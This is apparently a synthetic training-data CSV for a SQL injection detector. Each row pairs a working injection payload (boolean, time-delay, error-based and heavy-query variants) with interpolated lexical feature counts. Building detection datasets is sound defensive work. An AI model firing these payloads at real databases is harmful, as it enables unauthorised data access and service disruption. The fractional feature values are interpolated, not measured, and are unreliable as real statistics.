id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000091,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,2.8334553796941497,264.23626787156655,36.2018963592976,3.7276195279057984,81.21493382946858,30.201896359297596,110.01540791929297,42.80402976350739,0.2992389517708307,0.11912057519794536,0.41569271747391495,0.16594775555730898,4.0,0.0,0.0,0.0,0.0,1.5997629550878003,0.0,23.603318628770793,1.1995259101756006,1.4002370449121995,3.4002370449121995,9.200711134736599,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.4002370449121996,0.0,0.0,0.40023704491219964,1.5997629550878005,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.800474089824399,0.0,0.0,0.0,0.0,0.0,0.0,0.4002370449121996,0.4002370449121996,9.001185224560999
SMOTE_000092,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,0.9699640466103686,187.2536929316304,33.0,3.6935041708129304,51.97187493599848,24.802840874180987,77.40852262254296,33.070454498907985,0.2785602209522289,0.13212609946127402,0.41314554697146505,0.17616813261503203,4.366193187636502,0.0,0.0,0.18309659381825102,0.0,2.0,0.0,16.169034061817488,2.0,0.816903406181749,2.6338068123634977,7.084517030908744,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8169034061817491,0.0,0.0,0.0,0.0,1.816903406181749,0.1830965938182511,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.084517030908745,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.084517030908745
SMOTE_000093,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,3.166343787870749,161.15928227911536,34.94758188909467,3.938390675856525,57.31450866543197,16.633073223662702,59.842745667284014,27.368954722736678,0.35770791319345957,0.10163339196914611,0.37118074072655327,0.16947795411084104,3.4737909445473356,0.0,0.0,0.0,0.0,0.9475818890946717,0.0,12.0,0.0,2.0,1.0,7.895163778189343,1.0,0.0,0.0,0.0,0.0,0.47379094454733583,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.4737909445473358,0.5262090554526642,0.5262090554526642,0.47379094454733583,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000094,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,1.7234714610348332,382.38031192436983,33.46276802160862,3.405489425461952,106.94042883457378,44.04467837406966,176.134035122209,55.261169593517415,0.2808739873711044,0.11481360515974492,0.45969747713134923,0.14461493033780135,4.0,0.0,0.0,0.0,0.0,2.5074463956782767,0.0,36.52233918703483,0.0,0.49255360432172307,1.7388304064825848,12.507446395678276,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.24627680216086156,1.7537231978391388,0.0,0.0,0.24627680216086162,1.7537231978391383,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7537231978391384,0.0,0.0,0.0,0.0,10.768615989195693,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,17.276062384873967
SMOTE_000095,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,0.8665617165384615,386.6660195055628,32.238280141267765,3.342831840410591,104.98124822602844,45.514063830478676,180.54219149143603,55.62851595761967,0.27219940262151315,0.11749400874274915,0.46638397126801323,0.14392261736772444,4.0,0.0,0.0,0.0,0.0,2.752343971746446,0.0,37.25703191523934,0.0,0.24765602825355387,1.371484042380331,12.752343971746447,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.12382801412677699,1.8761719858732233,0.0,0.0,0.12382801412677685,1.8761719858732229,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8761719858732231,0.0,0.0,0.0,0.0,11.380859929366114,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.13320390111256
SMOTE_000096,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000013,0.30252008571324723,371.51985339505586,31.0,3.4118018126213996,95.84801466049441,58.0,166.51985339505586,51.151985339505586,0.25805862438293536,0.15614586627225754,0.4481051278308139,0.1376903815139932,0.0,0.0,2.8480146604944148,0.0,0.0,3.0,0.0,34.30397067901117,0.0,0.0,1.0,15.848014660494416,0.0,0.0,0.9240073302472074,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.9240073302472074,0.0,0.07599266975279273,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,12.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,19.0
SMOTE_000097,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,1.4263475247911983,37.79410788611733,15.50588105148231,3.100597114662467,4.011762102964617,11.782345783152703,16.000000000000007,6.0,0.10205137325476896,0.30099206821856905,0.4341502243830269,0.1628063341436351,0.747059474258845,0.0,2.252940525741155,0.0,0.0,1.2529405257411548,0.0,1.747059474258844,0.0,0.0,-2.220446049250313e-16,3.5058810514823096,0.7470594742588451,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2529405257411549,0.0,0.7470594742588451,0.25294052574115494,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2529405257411552
SMOTE_000098,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,4.534255675756689,49.51505028542783,21.18060203913705,3.54136659754618,15.063545187585206,8.180602039137053,17.622073613361124,8.64882944534445,0.30132731138716895,0.13193074761910956,0.37470580931673514,0.1920361316769863,0.0,2.3244147226722256,0.4414715742240751,1.1170568515518497,0.558528425775925,0.4414715742240751,0.0,2.8829431484481507,0.0,0.44147157422407507,0.4414715742240749,2.5585284257759247,0.0,1.0,0.0,0.0,0.5585284257759249,0.4414715742240751,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4414715742240751,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4414715742240753
SMOTE_000099,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,3.1425390659691166,270.916144160816,36.55117093651326,3.7322458516968293,83.96547112504189,30.551170936513255,112.8532638591702,43.546238240090666,0.30178898773146906,0.1176060193691559,0.4158999343264378,0.16470505857293727,4.0,0.0,0.0,0.0,0.0,1.556103632935843,0.0,24.214549138898196,1.1122072658716862,1.443896367064157,3.443896367064157,9.33168910119247,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.4438963670641569,0.0,0.0,0.4438963670641569,1.556103632935843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.887792734128314,0.0,0.0,0.0,0.0,0.0,0.0,0.44389636706415697,0.44389636706415697,9.219481835320785
SMOTE_000100,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.604327372907721,51.28107745463677,18.90089787886398,3.5758506022647367,9.661257030409573,18.85946127268161,16.7603591515456,6.0,0.18531875781358503,0.3704979789494113,0.3268127492213527,0.11737051401565096,0.0,0.3801795757727962,2.6198204242272034,0.0,0.0,2.0,0.0,1.0,0.0,0.0,-2.220446049250313e-16,4.619820424227203,0.0,0.3801795757727962,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.38017957577279626,0.6198204242272037,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000101,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,3.085171655717278,138.21632792935887,29.485069891018888,3.9363817715750753,69.85069891018887,8.0,42.94027956407555,17.425349455094434,0.5052733523992269,0.058153644278500366,0.31114742398187895,0.12542557934039383,0.0,1.9402795640755488,1.0298602179622256,0.0,1.0,1.4850698910188873,0.0,6.0,0.9701397820377745,0.0,2.0,3.5149301089811127,0.0,0.4850698910188873,0.5149301089811128,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.4850698910188873,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4850698910188873
SMOTE_000102,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.2268467222686505,132.44163368134974,29.79422315723456,3.992125397983098,66.05896420964608,10.117928419292154,41.0,15.26474105241152,0.49912109366506224,0.07542743185052353,0.3101262702841282,0.11532520420028604,0.0,0.26474105241151935,2.0,0.0,1.0,1.2647410524115195,0.0,5.735258947588481,0.0,0.0,2.0,4.2647410524115195,0.0,0.26474105241151935,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2647410524115193,1.0,0.7352589475884806,0.26474105241151935,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2647410524115195
SMOTE_000103,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,2.9961926597868964,52.869865113776285,20.173973022755256,3.350598321158463,15.47351658842426,5.73675829421213,21.635388991219138,10.024201239920753,0.294658444753797,0.08963366372781732,0.40822633317865703,0.2074815583397286,1.7246576742517523,0.7125570542913746,0.0,1.7125570542913746,0.7125570542913746,0.5748858914172508,0.0,3.724657674251752,0.5748858914172508,0.0,0.28744294570862516,3.0,0.2874429457086254,0.7125570542913747,0.0,0.0,0.7125570542913745,0.2874429457086255,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.2874429457086254,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.2874429457086256
SMOTE_000104,attack,boolean,"1%'   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000020,0.6241825942959094,201.85496998498408,29.389150213404932,3.4865917368583514,103.50885839195504,12.2918626600537,63.346111593029036,22.7081373399463,0.5031582392501835,0.06381185974203109,0.317999615064818,0.11503028594296738,4.194575106702467,0.0,0.0,0.09728755335123317,0.9027124466487668,2.0,0.0,8.0,2.0,0.0,5.513562233243835,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.9027124466487668,0.0,0.0,0.9027124466487668,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.805424893297534
SMOTE_000105,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.6711564386489088,200.35949532649838,36.0,3.892266495711557,62.53039488645344,25.859741110718296,76.7620842193154,35.20727511001123,0.31026545469824374,0.13202167644175333,0.381381464595602,0.17633140426440094,4.0,0.0,0.0,0.0,0.0,2.0,0.0,15.719482221436595,0.0,2.0,2.1158446664309785,10.74389644428732,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.6280517778563406,0.0,0.6280517778563405,0.0,0.37194822214365947,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.6036375550056157,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.231689332861957
SMOTE_000106,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,2.94974897127454,144.93590282198582,31.02136572600473,4.045969846469108,71.9359028219858,12.085462904018922,42.95726854799054,17.957268547990537,0.49611348049129067,0.08399130601536516,0.29622954501871135,0.12366566847463284,0.0,2.467951410992904,1.0213657260047304,0.0,1.0,2.0,0.0,5.489317136997635,0.9786342739952696,0.0,2.0,4.02136572600473,0.0,1.0,0.5106828630023652,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5106828630023652,1.0,0.9786342739952697,0.5106828630023652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000107,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.888049192509808,174.63319886411082,33.800461095334875,3.76164634942671,50.80968300203232,22.204149858013853,70.41291066937643,31.206455334688215,0.2909240785898799,0.12722776423036036,0.40374065042462454,0.1781075067551352,4.3990778093302545,0.0,0.0,0.19953890466512747,0.0,2.0,0.0,14.40368876267898,2.0,0.8004610953348725,2.600922190669745,7.002305476674363,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.8004610953348728,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.002305476674362,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.002305476674363
SMOTE_000108,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.3851925576503463,135.8442418245356,30.54547396037901,4.0058093386672695,67.87016592641817,10.207819943398585,41.0,16.766255954718865,0.5002604498988918,0.07316157161347542,0.3042338219570756,0.12234415653055715,0.6623459830195753,0.0,2.0,0.0,1.0,1.2207819943398586,0.0,5.779218005660142,0.0,1.1039099716992922,2.441563988679717,4.441563988679717,0.2207819943398585,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.2207819943398586,0.0,0.2207819943398586,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4415639886797167
SMOTE_000109,attack,boolean,"1%'  )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and   (  '%'  =  '",nearest_attack_euclidean,R000026,4.125062907307023,291.1876584946742,32.06183342026942,3.494882774135531,78.04691462366856,36.38166579730577,131.37741227639415,45.38166579730577,0.2700290374926355,0.12700050870569168,0.441634452251463,0.16133600155020975,4.0,0.0,0.0,0.0,0.0,2.4690832898652886,0.0,27.38166579730577,1.0618334202694228,0.5309167101347114,2.061833420269423,10.345416449326443,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5309167101347114,0.9381665797305772,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4690832898652886,0.0,0.0,0.0,0.0,8.28358302905702,0.0,0.0,0.0,0.0,0.0,0.0,0.4690832898652886,0.4690832898652886,12.628999478383463
SMOTE_000110,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,0.8154792845755796,36.169188315467835,15.289225108729044,3.0445868079964638,3.5784502174580908,10.590738098009743,16.000000000000007,6.0,0.09613429918797808,0.28545162094425014,0.44975569444928853,0.16865838541848321,0.855387445635478,0.0,2.144612554364522,0.0,0.0,1.1446125543645222,0.0,1.8553874456354773,0.0,0.0,-2.220446049250313e-16,3.2892251087290445,0.8553874456354779,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.14461255436452214,0.0,0.8553874456354779,0.1446125543645222,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1446125543645218
SMOTE_000111,attack,boolean,"-1772   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   8904  =  8904",nearest_attack_euclidean,R000029,0.18832185616153202,389.18418181994707,31.23994652354498,3.3101178275445333,94.59986630886245,57.448122995846546,184.13619251523806,53.0,0.24326299891516373,0.1475085380497207,0.47301960129827597,0.13620886173683955,0.09597860941799219,0.0,0.976005347645502,0.0,0.0,2.952010695291004,0.0,37.85603208587301,0.0,0.047989304708996094,1.0719839570634941,13.928016042936505,0.02399465235449799,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.023994652354498047,1.976005347645502,0.0,0.0,0.023994652354498047,1.0,0.976005347645502,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.976005347645502,0.0,0.0,0.0,0.0,11.880026738227508,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,18.83203743351851
SMOTE_000112,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000019,0.9477089937562587,84.97475151551289,27.04128274047938,3.838686651505886,23.54509178772767,22.611623012694157,26.950301098024916,11.86773561706615,0.2428270479728863,0.2912651402232649,0.3218192112467209,0.14408860055712783,0.0,1.0,2.8264528765867696,0.0,0.1735471234132305,2.0,0.0,3.3470942468264617,0.0,0.8264528765867695,1.1735471234132304,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.17354712341323053,0.0,1.0,0.17354712341323036,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.347094246826461
SMOTE_000113,attack,boolean,"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",nearest_attack_euclidean,R000024,4.159469445559309,302.0767813178672,31.945991688107796,3.471381947871322,80.7691953294668,37.54008311892204,137.22741975055632,46.54008311892204,0.269308793898192,0.12625910293876708,0.44507221068451597,0.1593598924785249,4.0,0.0,0.0,0.0,0.0,2.527004155946102,0.0,28.54008311892204,0.9459916881077955,0.4729958440538978,1.9459916881077957,10.63502077973051,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.47299584405389783,1.0540083118922043,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5270041559461022,0.0,0.0,0.0,0.0,8.689029091622714,0.0,0.0,0.0,0.0,0.0,0.0,0.5270041559461023,0.5270041559461023,13.324049871353225
SMOTE_000114,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,0.385197218867419,199.92501999744448,34.54625099987223,3.7695104641941306,58.45958966585742,24.910418333120372,80.3700079989778,36.1850039994889,0.29213119880554184,0.12506892299400954,0.4020235437411237,0.1807763344593249,4.0,0.0,0.0,0.0,0.0,2.0,0.0,17.09250199974445,2.0,1.1820836666240746,3.1820836666240746,8.728334666496298,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.364167333248149,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.364167333248149
SMOTE_000115,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,1.5614034079260821,118.5387555047139,29.303305230426886,4.034215721168723,54.168178767347875,16.26966947695731,34.79760202998184,13.303305230426886,0.4235220557155107,0.1656431469465449,0.29912554578286177,0.11170925155508263,0.0,1.0,2.0,0.0,0.7303305230426886,2.0,0.0,3.9213220921707546,0.0,0.0,1.4606610460853773,4.730330523042689,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7303305230426885,0.0,1.0,0.7303305230426888,0.26966947695731147,0.7303305230426886,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.4606610460853773
SMOTE_000116,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,2.370098033448816,141.587310278061,35.301517775511925,4.094264720272136,59.50813639540323,18.888828053572933,45.95227666326788,17.23806916581697,0.4200195264689366,0.13349398757159026,0.3247000082301238,0.1217864777293494,1.2380691658169711,0.5873102780610097,2.0,0.41268972193899034,0.5873102780610097,2.0,0.0,6.650758887755962,0.0,0.0,1.5873102780610098,5.412689721938991,0.41268972193899034,0.5873102780610097,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.5873102780610098,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5873102780610098
